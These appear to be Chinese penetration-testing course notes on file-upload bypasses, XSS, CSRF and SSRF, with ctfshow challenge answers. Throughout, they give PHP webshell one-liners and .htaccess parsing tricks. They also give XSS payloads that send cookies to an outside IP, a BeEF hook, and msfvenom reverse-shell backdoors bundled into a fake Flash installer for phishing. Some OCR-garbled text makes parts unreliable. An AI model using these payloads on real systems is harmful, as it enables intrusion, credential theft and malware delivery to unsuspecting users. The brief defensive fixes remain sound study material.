<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https //blog.csdn.net/qq 40800734/article/details/105920149</span><br><span class="line">get：0=system post：1=tac flag.php</span><br><span class="line">将后门代码写入图片（前提，读取文件是通过php解析，导致后门代码可执行）</span><br></pre></td></tr></table></figure>

<p>165 jpg二次渲染</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、先上传jpg正常，返回包发现渲染</span><br><span class="line">2、上传jpg渲染后保存，生成带代码图片</span><br><span class="line">调用执行：php jpg .php 1.jpg</span><br></pre></td></tr></table></figure>

<p>166 zip调用包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">直接上传zip后修改代码</span><br><span class="line"></span><br><span class="line">&lt;?=eval($POST[x]),?&gt;</span><br></pre></td></tr></table></figure>

<p>167 .htaccess妙用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.htaccess默认不支持nginx,设置后支持</span><br><span class="line">.htaccess可以通过设置实现文件解析配置</span><br><span class="line">将png后缀的文件解析成php</span><br><span class="line">AddType application/x-httpd-php png</span><br><span class="line">将png后缀的文件解析成php</span><br></pre></td></tr></table></figure>

<p>168 免杀后门（构造变量绕过函数过滤）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php $a=&#x27;syste&#x27;;$b=&#x27;m&#x27;,$c=$a.$b;$c(tac ./flagaa.php&#x27;):?&gt;</span><br></pre></td></tr></table></figure>

<p>169 170 日志包含</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">构造.user.in利用条件：上传index.php内容随意</span><br><span class="line">上传.user.ini包含日志：auto_prepend_fle=var/log/nginx/access.log</span><br><span class="line">访问地址带后门UA头写入日志：&lt;？=eval($POST[X):?&gt;</span><br><span class="line">上传.user.ini是利用文件包含 上传.htaccess是利用文件解析漏洞</span><br></pre></td></tr></table></figure>

<h1 id="第33天-WEB攻防-通用漏洞-文件上传-中间件解析漏洞8似编器安全"><a href="#第33天-WEB攻防-通用漏洞-文件上传-中间件解析漏洞8似编器安全" class="headerlink" title="第33天 WEB攻防-通用漏洞&amp;文件上传&amp;中间件解析漏洞8似编器安全"></a>第33天 WEB攻防-通用漏洞&amp;文件上传&amp;中间件解析漏洞8似编器安全</h1><h4 id="知识点：-16"><a href="#知识点：-16" class="headerlink" title="知识点："></a>知识点：</h4><p>1、文件上传-二次渣染<br>2、文件上传-简单免杀变异<br>3、文件上传-.htaccess妙用<br>4、文件上传-PHP语言特性</p>
<h4 id="详细点：-5"><a href="#详细点：-5" class="headerlink" title="#详细点："></a>#详细点：</h4><p>1、检测层面：前端，后端等<br>2、检测内容：文件头，完整性，二次渣染等<br>3、检测后缀：黑名单，白名单，MIME检测等<br>4、绕过技巧：多后缀解析，截断，中间件特性，条件竞争等</p>
<h4 id="本章课程内容：-2"><a href="#本章课程内容：-2" class="headerlink" title="#本章课程内容："></a>#本章课程内容：</h4><p>1、文件上传-CTF赛题知识点<br>2、文件上传-中间件解析&amp;编辑器安全<br>3、文件上传-实例CMS文件上传安全分析</p>
<h4 id="演示案例：-12"><a href="#演示案例：-12" class="headerlink" title="演示案例："></a>演示案例：</h4><p>中间件文件解析-lIS&amp;Apache&amp;Nginx<br>Web应用编辑器-Ueditor文件上传安全<br>实例CMS&amp;平台-中间件解析&amp;编辑器引用</p>
<p>#中间件文件解析-llS&amp;Apache&amp;Nginx<br>IIS 6 7文件名目录名<br>1、文件名：X.asp;.x.jpg<br>2、目录名：x.asp&#x2F;x.jpg<br>3、S7.X与Nginx解析漏洞一致<br>(该漏洞实现的条件：1中间件类型为IIS且版本对应 2、上传文件能不能修改目录或上传的文件名能增加命名)<br>(漏洞防护：严格命名规则：基于本地名命名、基于时间命名、基于随机字符命名 上传的文件名固定且目录无法创建则漏洞无法实现）</p>
<h4 id="Apache换行解析配置不当"><a href="#Apache换行解析配置不当" class="headerlink" title="#Apache换行解析配置不当"></a>#Apache换行解析配置不当</h4><p>1、换行解析-CVE-2017-15715      <a href="https://blog.csdn.net/youthbelief/article/details/121258770">https://blog.csdn.net/youthbelief/article/details/121258770</a>   复现文章<br>其2.4.0~2.4.29版本中存在一个解析漏洞</p>
<p>2、配置不当-.htaccess配置不当<br>AddHandier application&#x2F;x-httpd-php .php</p>
<h4 id="Nginx-文件名逻辑解析漏洞"><a href="#Nginx-文件名逻辑解析漏洞" class="headerlink" title="#Nginx 文件名逻辑解析漏洞"></a><strong>#Nginx 文件名逻辑解析漏洞</strong></h4><p>1,文件名逻辑-CVE-2013-4547<br>影响版本：Nginx 0.8.41 ~ 1.4.3 &#x2F; 1.5.0 ~ 1.5.7<br>注意此处文件名后要加空格</p>
<p>2.解析漏洞-nginx.conf配置不当<br>由此可知，该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。</p>
<h4 id="Web应用编辑器-Ueditor文件上传安全"><a href="#Web应用编辑器-Ueditor文件上传安全" class="headerlink" title="#Web应用编辑器-Ueditor文件上传安全"></a><strong>#Web应用编辑器-Ueditor文件上传安全</strong></h4><p>思路：制作图片马–将图片马上传到vps–上述代码保存为html文件，将访问地址修改为编译器地址—访问html文件将图片马地址填入（构造好的<a href="http://xxxx/ueditor.jpg?.aspx%EF%BC%89%E2%80%93%E7%82%B9%E5%87%BBsubmit%EF%BC%8C%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F%EF%BC%8C%E5%B9%B6%E8%BF%94%E5%9B%9E%E6%88%91%E4%BB%AC%E7%9A%84aspx%E8%84%9A%E6%9C%AC%E6%9C%A8%E9%A9%AC%E8%B7%AF%E5%BE%84%E5%9C%B0%E5%9D%80%E2%80%93shell%E8%BF%9E%E6%8E%A5">http://xxxx/ueditor.jpg?.aspx）–点击submit，直接上传成功，并返回我们的aspx脚本木马路径地址–shell连接</a><br>参考文章：<a href="https://codeleading.com/article/27805571408/#google_vignette">https://codeleading.com/article/27805571408/#google_vignette</a></p>
<h4 id="实例CMS-平台-中间件解析-编辑器引用"><a href="#实例CMS-平台-中间件解析-编辑器引用" class="headerlink" title="#实例CMS&amp;平台-中间件解析&amp;编辑器引用"></a>#实例CMS&amp;平台-中间件解析&amp;编辑器引用</h4><p>1、中间件配置不当导致文件被恶意解析<br>2、CMS源码引用外部编辑器实现文件上传</p>
<h1 id="第34天-WEB攻防-通用漏同8-文件上传8黑白盒审计8逻捐-中间件-外部引用"><a href="#第34天-WEB攻防-通用漏同8-文件上传8黑白盒审计8逻捐-中间件-外部引用" class="headerlink" title="第34天 WEB攻防-通用漏同8&amp;文件上传8黑白盒审计8逻捐&amp;中间件&amp;外部引用"></a>第34天 WEB攻防-通用漏同8&amp;文件上传8黑白盒审计8逻捐&amp;中间件&amp;外部引用</h1><h4 id="知识点：-17"><a href="#知识点：-17" class="headerlink" title="知识点："></a>知识点：</h4><p>1、白盒审计三要素<br>2、黑盒审计四要素<br>3、白黑测试流程思路</p>
<h4 id="详细点：-6"><a href="#详细点：-6" class="headerlink" title="#详细点："></a>#详细点：</h4><p>1、检测层面：前端，后端等<br>2、检测内容：文件头，完整性，二次渲染等<br>3、检测后缀：黑名单，白名单，MIME检测等<br>4、绕过技巧：多后缀解析，截断，中间件特性，条件竟争等</p>
<h4 id="本章课程内容：-3"><a href="#本章课程内容：-3" class="headerlink" title="#本章课程内容："></a>#本章课程内容：</h4><p>1、文件上传-CTF赛题知识点<br>2、文件上传-中间件解析&amp;编辑器安全<br>3、文件上传-实例CMS文件上传安全分析</p>
<h4 id="演示案例-1"><a href="#演示案例-1" class="headerlink" title="演示案例"></a>演示案例</h4><p>白盒审计-Finecms-代码常规-处理逻辑<br>白盒审计-CuppaCms-中间件.htaccess<br>白盒审计-Metinfo–编辑器引用-第三方安全</p>
<h4 id="白盒审计-Finecms-代码常规-处理逻辑"><a href="#白盒审计-Finecms-代码常规-处理逻辑" class="headerlink" title="#白盒审计-Finecms-代码常规-处理逻辑"></a>#白盒审计-Finecms-代码常规-处理逻辑</h4><p><a href="https://blog.csdn.net/m0_52920608/article/details/124457816">https://blog.csdn.net/m0_52920608/article/details/124457816</a></p>
<p>黑盒思路：寻找上传点抓包修改突破获取状态码及地址<br>审计流程：功能点代码文件代码块抓包调试验证测试</p>
<h4 id="白盒审计-CuppaCms-中间件-htaccess"><a href="#白盒审计-CuppaCms-中间件-htaccess" class="headerlink" title="#白盒审计-CuppaCms-中间件-.htaccess"></a>#白盒审计-CuppaCms-中间件-.htaccess</h4><p>总结：漏洞产生位置在用户中心上传头像处，因为未对文件内容进行过滤导致可以上传含有后门代码的文件，但是文件上传后会对文件进行重新命名，黑盒测试中会因为不知道上传文件路径文件名导致无法连接shell，白盒测试中则可以看到文件被命名为0x00.php</p>
<p>黑盒思路：存在文件管理上传改名奕破，访问后在突破<br>审计流程：功能点代码文件-代码块抓包调试验证测试<br>总结：上传点在后台文件管理–修改名称处–上传出会对文件进行严格过滤且会对文件进行重命名导致上传.user.in和.htaccess上传失败（白名单），在文件管理处可以对文件进行重命名，此处抓包可以抓到重命名的数据包，修改重命名后的文件名可以将png文件修改成php文件，访问发现403，是由于.htaccess配置文件导致media文件夹下php exe php5 等后缀名无法访问，在重命名处改包.&#x2F;&#x2F; 将文件上传到上一级目录绕过，文件访问正常。第二种绕过思路：直接把.htaccess文件删除。</p>
<h4 id="白盒审计-Metinfo-编辑器引用-第三方安全"><a href="#白盒审计-Metinfo-编辑器引用-第三方安全" class="headerlink" title="#白盒审计-Metinfo-编辑器引用-第三方安全"></a>#白盒审计-Metinfo-编辑器引用-第三方安全</h4><p>黑盒思路：探针目录利用编辑器漏洞验证测试<br>审计流程：目录结构-引用编辑器编辑器安全查询-EXP利用验证<br>总结：目录扫描–扫描出fackeditor目录–判断版本–使用exp上传webshell</p>
<h4 id="文件上传："><a href="#文件上传：" class="headerlink" title="#文件上传："></a>#文件上传：</h4><p>黑盒：寻找一切存在文件上传的功彰应用<br>1、个人用户中心是否存在文件上传功能<br>2、后台管理系统是佛存在文件上传功能<br>3、字典目录扫描探针文件上传构造地址<br>4、字典目录扫描探针编辑器目录构造地址<br>白盒：看三点，中间件，编辑器，功能代码<br>1、中间件直接看语言环境常见搭配<br>2、编辑器直接看目录机构或搜索关键字<br>3、功能代码直接看源码应用或搜索关键字</p>
<h1 id="第35天-WEB攻防-通用漏洞-XSS跨站-反射-存储-DOM-盲打-劫持"><a href="#第35天-WEB攻防-通用漏洞-XSS跨站-反射-存储-DOM-盲打-劫持" class="headerlink" title="第35天 WEB攻防-通用漏洞&amp;XSS跨站&amp;反射&amp;存储&amp;DOM&amp;盲打&amp;劫持"></a>第35天 WEB攻防-通用漏洞&amp;XSS跨站&amp;反射&amp;存储&amp;DOM&amp;盲打&amp;劫持</h1><h4 id="知识点：-18"><a href="#知识点：-18" class="headerlink" title="知识点："></a>知识点：</h4><p>1、XSS跨站-原理&amp;攻击&amp;分类等<br>2、XSS跨站-反射型&amp;存储型&amp;DOM型等<br>3、XSS跨站攻击手法&amp;劫持&amp;恣取凭据等<br>4、XSS跨站-攻击项目&amp;XSS平台&amp;Beef-XSS</p>
<p>1、原理<br>指改击者利用网程序对用户输入过不足，端入可以量示在页面上对其他用尸道成影响的HTML代码，从而盗取用户资料、利用用户具份进行某种动或者对访问者进行病毒侵害的一种攻击方式，通过在用户端注入恶意的可执行脚本，若服务器时用户的第人不进行处理或处理不严，则浏览器就会夏接执行用户注入的脚本。<br>产生的地点：<br>数据文互的地方<br>get.post.headers<br>反馈与浏览<br>富文本编辑器<br>各类标签插入和自定义<br>数据输出的地方<br>用户资料<br>关键词、标签、说明<br>文件上传</p>
<p>2、分类<br>反射型（非持久型）<br>存储型（特久型）<br>DOM型<br>mXSS(突变型XSS)<br>UXSS(通用型XSs)<br>Flash XSS<br>UTF-7 XSS<br>MHTML XSS<br>CSS XSS<br>VBScript XSS</p>
<p>3、危害<br>网络钓鱼，包括获取各类用户账号：<br>窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份对网站执行操作；<br>劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、发表日志、邮件等；<br>强制弹出广告页面、刷流量等：<br>网页挂马；<br>进行恶意操作，如任意算改页面信息、别除文章等；<br>进行大量的客户端攻击，如ddos等；<br>获取客户端信息，如用户的浏览历史、真实即、开放端口等；<br>控制受害者机器向其他网站发起攻击；<br>结合其他漏洞，如cS什，实施进一步危害；<br>提升用户权限，包括进一步渗透网站；<br>传懂跨站却本螺虫等</p>
<h4 id="XSS跨站系列内容："><a href="#XSS跨站系列内容：" class="headerlink" title="#XSS跨站系列内容："></a>#XSS跨站系列内容：</h4><p>1加粗样式、XSS跨站-原理8分类8手法<br>2、XSS站-探针&amp;利用&amp;审计<br>3、XSS聘站-另类攻击手法利用<br>4、XSS跨站-防御修复8饶过策暗</p>
<h4 id="演示案例：-13"><a href="#演示案例：-13" class="headerlink" title="演示案例："></a>演示案例：</h4><p>XSS跨站-原理&amp;分类&amp;手法&amp;探针<br>反射型实例-UA查询平台数据输出<br>思路：网站存在读取请求包中UA头并显示的功能–抓包修改UA头添加xss语句–xss语句执行<br>存储型实例-订单系统CMS权限获取<br>思路：留言板处会将输入保存到数据库中，后台管理员查看时会执行xss语句。此处xss语句可以替换为盗取cookie的语句，管理员执行后将管理员账号cookie发送到xss平台，从而盗取cookie。<br>DOM型实例-EmpireCMS前端页面审计<br>javascript:alter(1)这里不是传参，因此要改变写法<br>XSS利用环境-XSS平台&amp;Beef-XSS项目      —Beef很有用，直接要是受害者访问你的网站，即可去执行相关有害事件。<br>搭建beef-xss平台后，若受害者访问 <script src="http://192.168.1.105:3000/hook.js"></script> 则会被劫持浏览器，可以获取受害者cookie、跳转网站、钓鱼等。<br>参考文章：<a href="https://blog.csdn.net/qq_53517370/article/details/128992559">https://blog.csdn.net/qq_53517370/article/details/128992559</a>    –很不错，讲了很多beef的使用方法</p>
<h1 id="第36天-WEB攻防-通用漏洞-XSS跨站-MXSS-UXSS-FlashXSS-PDFXSS"><a href="#第36天-WEB攻防-通用漏洞-XSS跨站-MXSS-UXSS-FlashXSS-PDFXSS" class="headerlink" title="第36天 WEB攻防-通用漏洞&amp;XSS跨站&amp;MXSS&amp;UXSS&amp;FlashXSS&amp;PDFXSS"></a>第36天 WEB攻防-通用漏洞&amp;XSS跨站&amp;MXSS&amp;UXSS&amp;FlashXSS&amp;PDFXSS</h1><h4 id="知识点：-19"><a href="#知识点：-19" class="headerlink" title="知识点："></a>知识点：</h4><p><a href="https://blog.csdn.net/m0_60571842/article/details/132763262">https://blog.csdn.net/m0_60571842/article/details/132763262</a>      —对全部xss进行更详细的讲解</p>
<p>mXSS(突变型XSS)<br>UXSS(通用型XSs)<br>Flash XSS<br>UTF-7 XSS<br>MHTML XSS<br>CSS XSS<br>VBScript XSS</p>
<h4 id="演示案例：-14"><a href="#演示案例：-14" class="headerlink" title="演示案例："></a>演示案例：</h4><p>UXSS-Edge&amp;CVE-2021-34506<br>FlashXSS-PHPWind.&amp;SWF反编译<br>PDFXSS-PDF动作添加&amp;文件上传</p>
<h4 id="MXSS-https-www-fooying-com-the-art-of-xss-1-introduction"><a href="#MXSS-https-www-fooying-com-the-art-of-xss-1-introduction" class="headerlink" title="#MXSS:https://www.fooying.com/the-art-of-xss-1-introduction/"></a>#MXSS:<a href="https://www.fooying.com/the-art-of-xss-1-introduction/">https://www.fooying.com/the-art-of-xss-1-introduction/</a></h4><h4 id="UXsS全称Jniversal-Cross-Site-Scripting"><a href="#UXsS全称Jniversal-Cross-Site-Scripting" class="headerlink" title="#UXsS全称Jniversal Cross-.Site Scripting"></a>#UXsS全称Jniversal Cross-.Site Scripting</h4><p>UXSS是利用浏览器或者浏览器扩展漏洞来制造产生XSS并执行代码的一种攻击类型。<br>MICROSOFT EDGE UXSS CVE-2021-34506<br>Edge浏览器翻译功能导致JS语句被调用执行<br><a href="https://www.bilibili.com/video/BV1fX4y1c7rX">https://www.bilibili.com/video/BV1fX4y1c7rX</a></p>
<h4 id="Flashxss-swf引用js的xss"><a href="#Flashxss-swf引用js的xss" class="headerlink" title="#Flashxss-swf引用js的xss"></a>#Flashxss-swf引用js的xss</h4><p>JPEXS Free Flash Decompiler<br>phpwind SWF反编译Flashxss<br>Externallnterface.call执行JS代码<br>Payload:&#x2F;res&#x2F;js&#x2F;dev&#x2F;util_libs&#x2F;jPlayer&#x2F;Jplayer.swf?jQuery&#x3D;alert(1)))catch(e)0&#x2F;&#x2F;<br>思路：类似反射型XSS，通过对wsf文件进行反编译找出传参点，构造闭合传参使得xss语句执行</p>
<h4 id="PDFXSS-上传后直链发"><a href="#PDFXSS-上传后直链发" class="headerlink" title="#PDFXSS-上传后直链发"></a>#PDFXSS-上传后直链发</h4><p>1、创建PDF,加入动作JS<br>2、通过文件上传获取直链<br>3、直链地址访问后被缺发<br>危害：恶意pdf上传，受害者点击文件分享链接可被XSS平台和beefxss平台利用</p>
<h1 id="第37天-WEB攻防-通用漏洞-XSS跨站-权限维持-钓鱼捆绑-浏览器漏洞"><a href="#第37天-WEB攻防-通用漏洞-XSS跨站-权限维持-钓鱼捆绑-浏览器漏洞" class="headerlink" title="第37天 WEB攻防-通用漏洞&amp;XSS跨站&amp;权限维持&amp;钓鱼捆绑&amp;浏览器漏洞"></a>第37天 WEB攻防-通用漏洞&amp;XSS跨站&amp;权限维持&amp;钓鱼捆绑&amp;浏览器漏洞</h1><h4 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h4><p>XSS跨站-另类攻击手法利用</p>
<h4 id="演示案例：-15"><a href="#演示案例：-15" class="headerlink" title="演示案例："></a>演示案例：</h4><p>XSS-后台植入Cookie&amp;表单劫持<br>XSS-Flash钓鱼配合MSF捆绑上线<br>XSS-浏览器网马配合MSF访问上线</p>
<h4 id="XSS-后台植入Cookie-表单劫持"><a href="#XSS-后台植入Cookie-表单劫持" class="headerlink" title="#XSS-后台植入Cookie&amp;表单劫持"></a>#XSS-后台植入Cookie&amp;表单劫持</h4><p>条件：已取得相关web权限后         —就比如将危险xss代码放在博客的主页，就可以去利用beef去获取访问者的信息<br>1、写入代码到登录成功文件，利用beef或xss平台实时监控Cookie等凭据实现权限维持<br>（思路：将xss语句写入登录成功的默认文件，用户登录成功后会直接将信息发送到xss平台）<br>2、若存在同源策路或防护情况下，Cookie获取失败可采用表单劫持或数据明文传输实现<br>（思路：将xss语句写入验证密码的文件，设置变量接收用户名和密码通过xss语句送到到VPS接收数据）</p>
<h4 id="XSS-Flash钓鱼配合MSF捆绑上线"><a href="#XSS-Flash钓鱼配合MSF捆绑上线" class="headerlink" title="#XSS-Flash钓鱼配合MSF捆绑上线"></a>#XSS-Flash钓鱼配合MSF捆绑上线</h4><p>条件：beef上线受控后或直接钓鱼(受害者爱看SESE)                  ——–<a href="https://blog.csdn.net/weixin_43225966/article/details/130291934">https://blog.csdn.net/weixin_43225966/article/details/130291934</a><br>1、生成后门<br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;xx.xx.xx.xx LPORT&#x3D;6666-f exe<br>flash exe<br>2、下载官方文件保证安装正常<br>3、压缩捆绑文件-解压提取运行<br>4、MSF配置监听状态<br>use exploit&#x2F;multi&#x2F;handler<br>set payload windows&#x2F;meterpreter&#x2F;reverse tcp<br>set Ihost 0.0.0.0<br>set Iport 6666<br>run<br>5、诱使受害者访问URL-语言要适当<br>前期准备：后门文件准备：msf生成后门.exe文件，通过压缩将后门文件和flash安装文件放一起，压缩时选择解压前运行.exe文件，可对后门文件做免杀<br>诱使受害者访问构造好的flash页面–点击下载出插入xss语句–执行后门文件下载–压缩时运行 –上线</p>
<h4 id="XSS-浏览器网马配合MSF访问上线"><a href="#XSS-浏览器网马配合MSF访问上线" class="headerlink" title="#XSS-浏览器网马配合MSF访问上线"></a>#XSS-浏览器网马配合MSF访问上线</h4><p>条件：beef上线受控后或直接钓鱼(浏览器存在0day)<br>1、配置MSF生成URL<br>use exploit&#x2F;windows&#x2F;browser&#x2F;ms14_064_ole_code_execution<br>set allowpowershellprompt true<br>set target 1<br>run<br>2、诱使受害者访问URL-语言要适当<br>思路：诱使受害者访问含有beefxss 语句的网站页面–beefxss平台执行网站跳转–跳转到含有payload的网站–上线   </p>
<h1 id="第38天-WEB攻防-通用漏洞-XSS跨站-绕过修复-http-only-CSP-标签符号"><a href="#第38天-WEB攻防-通用漏洞-XSS跨站-绕过修复-http-only-CSP-标签符号" class="headerlink" title="第38天 WEB攻防-通用漏洞&amp;XSS跨站&amp;绕过修复&amp;http-only&amp;CSP&amp;标签符号"></a>第38天 WEB攻防-通用漏洞&amp;XSS跨站&amp;绕过修复&amp;http-only&amp;CSP&amp;标签符号</h1><h4 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h4><p>4、修复<br>1、过滤一些危险字符<br>2、HTTP-only Cookie<br>3、设置CSP(Content Security Policy)<br>4、输入内容长度限制，转义等</p>
<h4 id="演示案例：-16"><a href="#演示案例：-16" class="headerlink" title="演示案例："></a>演示案例：</h4><p>XSS绕过-CTFSHOW-361到331关卡绕过WP<br>XSS修复-过滤涵数&amp;http_only&amp;CSP&amp;长度限制</p>
<p>绕过：https:z.aliyun.com&#x2F;t&#x2F;4067</p>
<p>ctfshow刷题记录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">316-反射型直接远程调用</span><br><span class="line">前置知识：document.cookie是用来直接获取cookie的，window.location.href是获取跳转地址的</span><br><span class="line">&lt;script&gt;window.location.href=&#x27;http://47.94.236.117/get.php?c=&#x27;+document.cookie&lt;/script&gt;</span><br><span class="line">317-反射型-过滤&lt;script&gt;</span><br><span class="line">&lt;img src=1onerror=window.location.href=&#x27;http://47.94.236.117/getphp?c=&#x27;+document cookie,&gt;</span><br><span class="line">318  319-反射型-过滤&lt;img&gt;</span><br><span class="line">&lt;inputonload=&quot;window.location.href=&#x27;http://47.94.236.117/get.php?c=&#x27;+document.cookie:&quot;&gt;</span><br><span class="line">&lt;svgonload=&quot;window.location.href=&#x27;http://47.94.236.117/getphp?c=&#x27;+document cookie;&quot;&gt;</span><br><span class="line">320-326-反射型过滤空格</span><br><span class="line">&lt;svg/onload=&quot;window.location.href=&#x27;http://47.94.236.117/get.php?c=&#x27;+document cookie;&quot;</span><br><span class="line">327存储型无过滤</span><br><span class="line">&lt;script&gt;window.location href=&#x27;http://47.94.236.117/get.php?c=&#x27;+document cookie&lt;/script&gt;</span><br><span class="line">328存储型注册插入JS</span><br><span class="line">&lt;script&gt;window.location.href=&#x27;http://47.94.236.117/get.php?c=&#x27;+document cookie&lt;/script&gt;</span><br><span class="line">思路：在密码处插入xss语句--获取cookie--抓包替换cookie--管理员权限获取flag（用户名处会过滤某些关键字 手动狗头）</span><br><span class="line">329 存储型 失效凭据需1步完成所需操作</span><br><span class="line">思路：利用js语句直接读取管理员页面中标签中的flag然后通过xss语句发送到vps</span><br><span class="line">&lt;script&gt;</span><br><span class="line">$(&#x27;.laytable-cell-1-0-1&#x27;).each(function(index,value)&#123;if(value.innerText.indexOf(&#x27;ctfshow&#123;&#x27;)&gt;-1)&#123;location.href=&#x27;http://ip/x.php?cookie=&#x27;+value.innerText&#125;&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">330-存储型-借助修改密码重置管理员密码(GET)  类似于crsf，通过xss代码注册，使得管理员执行修改密码的语句，攻击者获得密码后即可</span><br><span class="line">&lt;script&gt;window.location.href=&#x27;http://127.0.0.1/api/change.php?p=123&#x27;;&lt;/script&gt;</span><br><span class="line">331-存储型借助修改密码重置管理员密码P0ST)</span><br><span class="line">&lt;script&gt;$.ajax(&#123;url &#x27;http://127.0.0.1/api/change.php&#x27;type&#x27;post&#x27;.data &#123;p&#x27;123&#x27;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="XSS修复-过滤函数-http-only-CSP-长度限制"><a href="#XSS修复-过滤函数-http-only-CSP-长度限制" class="headerlink" title="#XSS修复-过滤函数&amp;http_only&amp;CSP&amp;长度限制"></a>#XSS修复-过滤函数&amp;http_only&amp;CSP&amp;长度限制</h4><p>1、过滤一些危险字符，以及转义&amp; &lt;&gt; “ ·等危险字符<br>自定义过滤函数引用<br>2、HTTP-only Cookie<br><a href="https://www.php.cn/php-ask-457831.html">https://www.php.cn/php-ask-457831.html</a><br>php.in 设置或代码引用<br>session.cookie httponly &#x3D;1<br>ini set(“session.cookie httponly”,1);</p>
<p>http-only的设置能够去防止cookie被<strong>完全</strong>的盗取，使js脚本无法获取完整全部的cookie</p>
<p>相关文章：<a href="https://blog.csdn.net/qq_38553333/article/details/80055521">https://blog.csdn.net/qq_38553333/article/details/80055521</a></p>
<p>3、设置CSP(Content Security Policy) 防止资源外发 防止网页加载恶意脚本和其他危险资源<br><a href="https://blog.csdn.net/a1766855068/article/details/89370320">https://blog.csdn.net/a1766855068/article/details/89370320</a><br>header(“Content-Security-Policy:img-src ‘self “)<br>4、输入内容长度限制，实体转义等</p>
<h1 id="第40天-WEB攻防-通用漏洞-CSRF-SSRF-协议玩法-内网探针-漏洞利用"><a href="#第40天-WEB攻防-通用漏洞-CSRF-SSRF-协议玩法-内网探针-漏洞利用" class="headerlink" title="第40天 WEB攻防-通用漏洞&amp;CSRF&amp;SSRF&amp;协议玩法&amp;内网探针&amp;漏洞利用"></a>第40天 WEB攻防-通用漏洞&amp;CSRF&amp;SSRF&amp;协议玩法&amp;内网探针&amp;漏洞利用</h1><h4 id="知识点：-20"><a href="#知识点：-20" class="headerlink" title="知识点："></a>知识点：</h4><p>1、CSRF-原理&amp;危害&amp;探针&amp;利用等<br>2、SSRF-原理&amp;危害&amp;探针&amp;利用等<br>3、CSRF&amp;SSRF-黑盒下漏洞探针点</p>
<h4 id="详细点：-7"><a href="#详细点：-7" class="headerlink" title="#详细点："></a>#详细点：</h4><p><a href="https://blog.csdn.net/qq_43378996/article/details/123910614">https://blog.csdn.net/qq_43378996/article/details/123910614</a>         ——CSRF详解</p>
<p>CSRF全称：Cross-site request forgery,即，跨站请求伪造，也被称为“One Click Attack”或“Session Riding”，通常缩写为CSRF或者XSRF,，是一种对网站的恶意利用。举个生活中的例子：就是某个人点了个奇怪的链接，自己什么也没输，但自己的qg号或其他的号就被盗了。即该攻击可以在受害者不知情的情况下以受害者名义伪造请求，执行恶意操作，具有很大的危害性。<br>CSRF的攻击过程两个条件：<br>1、目标用户已经登录了网站，能够执行网站的功能。<br>2、目标用户访问了攻击者构造的URL,<br>CSRF安全问题黑盒怎么判断：<br>1、看验证来源不-修复<br>2、看凭据有无token-修复<br>3、看关键操作有无验证-修复<br>-CSRF安全问题白盒怎么审计：<br>同黑盒思路一样，代码中分析上述三看</p>
<p>SSRF(Server-Side Request Forgery:服务器端请求伪造)是一种由攻击者构造形成由服务端发起请求的一个安全漏同。一股情况下，SS凡F攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔高的内部系统）SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片 地址等<br>SSRF黑盒可能出现的地方：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.社交分享功能：获取超链接的标题等内容进行显示</span><br><span class="line">2.转码服务：通过UL地址把原地址的网页内容调优使其适合手机屏幕浏览</span><br><span class="line">3.在线到译：给网止到译对应网页的内容</span><br><span class="line">4图片加载下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</span><br><span class="line">5.图片文章收载功能：主要其会取URL地址中titl以及文本的内容作为显示以求一个好的用具体验</span><br><span class="line">6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</span><br><span class="line">7.网站采集，网站抓取的地方：一些网站会针对你输入的u进行一些信悬采集工作</span><br><span class="line">8.数后库内置功能：数据库的比如mongodb的copyDatabase函致</span><br><span class="line">9.邮件系统：比如接收邮件服务器地址</span><br><span class="line">10.编码处理，属性信息处理，文件处理：比如fpmg,ImageMagick,docX,pdf,Xml收处理器等</span><br><span class="line">11.未公开的pi实现以及其他扩展调用URL的功能：可以利用g0ogle语法动加上这些关键字去寻找SSRF漏洞一些的url中的关键字：share、wap、url、ink、src、source、target、.u、3g、display、sourceURI、imageURL、domain.-.-</span><br><span class="line">12.从远程服务器请求资源（upload from url如discuz!;mpot&amp;expost rss feed如webblog;使用了xmi写引擎对象的地方如vordpress xmlrpc.php)</span><br></pre></td></tr></table></figure>

<p>可能利用的伪协议：            ———-特别是在ctf赛题中，经常会出现这个。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:/// 从文件系统中获取文件内容，如，file:///etc/passwd</span><br><span class="line">dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：</span><br><span class="line">sftp:// SSH文件传输协议或安全文件传输协议</span><br><span class="line">ldap:// 轻量级目录访问协议</span><br><span class="line">tftp:// 简单文件传输协议</span><br><span class="line">gopher:// 分布式文档传递服务，可使用gopherus生成payload</span><br></pre></td></tr></table></figure>

<p>-SSRF白盒可能出现的地方：</p>
<p>1、功能点抓包指向代码块审计</p>
<p>2、功能点函数定位代码块审计</p>
<p>-SSRF常见安全修复防御方案：<br>1、禁用跳转</p>
<p>2、禁用不需要的协议</p>
<p>3、固定或限制资源地址</p>
<p>4、错误信息统一信息处理</p>
<p><img src="https://img-blog.csdnimg.cn/direct/607f655f46a045e68d3aa0053dfd2857.png" alt="在这里插入图片描述"></p>
